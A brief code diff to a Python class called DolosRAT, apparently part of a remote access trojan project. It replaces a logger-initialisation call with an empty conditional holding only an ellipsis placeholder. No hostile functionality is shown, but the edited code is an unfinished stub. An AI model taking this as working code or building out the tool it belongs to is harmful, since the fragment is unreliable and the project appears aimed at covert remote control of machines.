@@ -106,8 +106,9 @@ class DolosRAT:
         With handles created for the classes pertinent
         to the application, use these to commence DolosRAT.
         """
-        self._init_logger()
-
+        if self._logger:
+            ...
+            
     def start(self: object) -> None:
         """Exposed method for 'starting' DolosRAT.
 
